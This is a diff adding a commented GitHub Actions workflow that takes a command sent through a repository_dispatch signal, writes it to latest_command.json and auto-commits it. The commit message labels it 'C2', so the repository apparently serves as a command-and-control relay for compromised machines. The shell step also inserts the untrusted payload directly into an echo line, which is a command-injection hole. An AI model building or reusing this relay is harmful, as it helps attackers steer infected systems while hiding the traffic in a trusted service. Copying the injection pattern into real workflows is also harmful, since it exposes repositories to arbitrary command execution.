@@ -1,0 +1,28 @@
+# This file tells GitHub what to do when it receives our signal.
+
+name: Update Command File
+
+# This part says "Run this action when a 'repository_dispatch' signal is received"
+on:
+  repository_dispatch:
+    types: [new-command]
+
+jobs:
+  update-json:
+    runs-on: ubuntu-latest
+    steps:
+      # Step 1: Check out the repository's code so we can edit it
+      - name: Check out repository
+        uses: actions/checkout@v3
+
+      # Step 2: Create the latest_command.json file using the command from the signal
+      - name: Create command file
+        run: |
+          echo '{ "command": "${{ github.event.client_payload.command }}", "timestamp": $(date +%s) }' > latest_command.json
+      
+      # Step 3: Automatically commit and push the new file to the repository
+      - name: Commit and push changes
+        uses: stefanzweifel/git-auto-commit-action@v4
+        with:
+          commit_message: "C2: Update command file"
+          file_pattern: latest_command.json
